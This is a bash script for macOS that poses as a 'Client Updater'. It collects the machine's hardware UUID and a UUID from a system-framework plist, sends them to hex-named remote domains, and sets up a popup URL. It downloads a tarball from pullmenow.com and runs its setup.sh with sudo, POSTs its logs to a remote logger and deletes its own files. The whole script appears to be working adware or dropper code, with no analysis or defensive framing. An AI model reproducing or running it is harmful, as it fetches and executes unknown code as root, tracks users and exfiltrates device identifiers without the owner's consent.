#!/bin/bash
# ioreg -l | grep -e Manufacturer -e 'Vendor Name'
updFile="/var/tmp/updText.txt"
updFileError="/var/tmp/updTextError.txt"
chmod 777 $updFile;
chmod 777 $updFileError;
echo > $updFile
echo > $updFileError
br_mid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ { split($0, line, "\""); printf("%s\n", line[4]); }')
midFile=$(find /System/Library/Frameworks -type f -name "*.uuid.plist" -print0 | xargs -0 ls -tl | sort -n | tail -1 | awk '{print $9}')
if [ -e "$midFile" ]; then
    mid=$(echo "$midFile" | python -c 'import sys;print open(sys.stdin.read().rstrip(), "r").read().split("<string>")[1].split("</string>")[0]')
    echo "mid: $mid." >> $updFile
fi
get_pd_client_data="http://93a555685cc7443a8e1034efa1f18924.com/v/cld?mid=$br_mid&ct=pd"
data=$(curl -s "$get_pd_client_data")
dc=""
channel=$(echo $dc | tr -d '[[:space:]]' | tr -cd 0-9)
pdChannel=${dc:2}
echo "DC: $dc" >> $updFile
click_id=""
echo "CLICK_ID: $click_id" >> $updFile
click_stamp=""
echo "CLICK_STAMP: $click_stamp" >> $updFile
id=$dc"--"$click_id"___"$click_stamp"___"$br_mid
echo "Full ID: $id" >> $updFile
domain=""http://aabcdebbb2226646b5bb8b11368342c830.com""
pop_url="'http://aabcdebbb2226646b5bb8b11368342c830.com/pp/fd?re=1&uid=[MACHINE_ID]&u=[CONTEXT_URL]'"
pop_delay="1"

if [ $midFile ]; then
	frm=$(echo $midFile | tail -1 | awk -F "/" '{print $5}' | awk -F "." '{print $1}')
fi
mid_proc=false
if [ $frm ];then
	if ps -ef | grep -v grep | grep -q $frm; then
		mid_proc=true
	fi
fi
echo "midFile: $midFile." >> $updFile
echo "frm: $frm" >> $updFile
echo "mid_proc: $mid_proc" >> $updFile

pClt () {
    tgzfile="/var/tmp/up.tgz"
    updDir="/var/tmp/temp_updater_08-05-2016-8"
    updSh="/var/tmp/temp_updater_08-05-2016-8/setup.sh"
	echo "Starting Client Updater Script" >> $updFile
	/usr/bin/curl -s -L -o ${tgzfile} "http://pullmenow.com/pd_files/client/temp_updater_08-05-2016-8.tgz"
	tar -xzf ${tgzfile} -C /var/tmp/
	if [ -f ${updSh} ]; then
		echo "${updSh} Exists"  >> $updFile
		sudo chmod 777 ${updSh}
		cd ${updDir}
		sudo ./setup.sh
    else
        echo "${updSh} Not Exists"  >> $updFile
    fi
}

echo "Installing pClt with logger" >> $updFile
pClt &> $updFileError;
sleep 10
echo $(</var/tmp/updTextError.txt) >> $updFile
sudo rm -rf ${tgzfile}
sudo rm -rf ${updDir}

eventType="Update Script Output"
sleep 30
curl --request POST 'http://93a555685cc7443a8e1034efa1f18924.com/v/pd-logger' --data "vs_mid=$mid" --data "br_mid=$br_mid" --data-urlencode "event_type=$eventType" --data-urlencode "event_data=$(<$updFile)"
sleep 5
rm -rf $updFile
rm -rf /var/tmp/updText2.txt
rm -rf $updFileError
